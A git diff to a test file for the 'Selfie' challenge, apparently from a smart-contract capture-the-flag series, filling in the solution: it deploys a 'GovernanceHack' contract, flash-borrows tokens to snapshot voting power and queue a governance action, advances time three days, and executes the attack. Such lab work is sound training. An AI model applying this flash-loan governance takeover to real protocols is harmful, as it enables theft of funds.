@@ -38,7 +38,17 @@ describe('[Challenge] Selfie', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+      /** CODE YOUR SOLUTION HERE */
+      // Setup our contract        
+      const GovernanceHackFactory = await ethers.getContractFactory('GovernanceHack', player);
+      let hackContract = await GovernanceHackFactory.deploy(pool.address, governance.address, token.address);
+      
+      // Call its setup function to flash snapshot and queue action
+      await hackContract.setupTarget();
+      // Wait for the delay to pass, and more
+      await ethers.provider.send("evm_increaseTime", [3 * 24 * 60 * 60]); // 3 days
+      // Execute our action now that time has passed
+      await hackContract.executeAttack();
     });
 
     after(async function () {
